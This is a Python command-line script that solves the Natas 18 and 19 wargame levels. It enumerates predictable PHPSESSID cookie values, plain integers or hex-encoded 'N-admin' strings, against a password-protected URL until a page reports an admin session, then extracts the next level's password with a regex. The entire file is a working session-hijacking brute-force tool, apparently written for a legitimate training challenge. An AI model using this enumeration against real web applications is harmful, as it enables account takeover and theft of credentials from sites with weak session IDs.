#!/usr/bin/env python3
import argparse
import requests
import binascii
import time
import re


def generate_session_id(i: int, mode: str) -> str:
    """
    Generate PHPSESSID value depending on challenge mode.
    """
    if mode == "18":
        return str(i)
    elif mode == "19":
        return binascii.hexlify(f"{i}-admin".encode()).decode()
    else:
        raise ValueError("Invalid mode. Use 18 or 19.")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Enumerate PHP session IDs for Natas 18 / 19"
    )

    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--user", default="natas18", help="Username (default: natas18)")
    parser.add_argument("--password", required=True, help="HTTP auth password")

    parser.add_argument(
        "--mode",
        choices=["18", "19"],
        required=True,
        help="Natas level (18 or 19)"
    )

    parser.add_argument("--start", type=int, default=1)
    parser.add_argument("--end", type=int, default=640)
    parser.add_argument("--delay", type=float, default=0.05)
    parser.add_argument(
        "--match",
        default="You are an admin",
        help="String indicating successful admin session"
    )

    return parser.parse_args()


def main():
    args = parse_args()

    print(f"[*] Target: {args.url}")
    print(f"[*] Mode: Natas {args.mode}")
    print(f"[*] Range: {args.start} → {args.end}")
    print()

    for i in range(args.start, args.end + 1):
        sid = generate_session_id(i, args.mode)

        try:
            r = requests.get(
                args.url,
                auth=(args.user, args.password),
                cookies={"PHPSESSID": sid},
                timeout=6
            )
        except requests.RequestException:
            continue

        if args.match in r.text:
            print("\n[+] ADMIN SESSION FOUND")
            print(f"    ID        : {i}")
            print(f"    PHPSESSID : {sid}")

            # Try extracting next-level password (Natas 19 behavior)
            match = re.search(r"password for natas\d+\s*is\s*<b>([^<]+)</b>", r.text)
            if match:
                print(f"    PASSWORD  : {match.group(1)}")

            return

        if i % 50 == 0:
            print(f"[*] Tried up to {i}")

        time.sleep(args.delay)

    print("[-] No valid session found.")


if __name__ == "__main__":
    main()
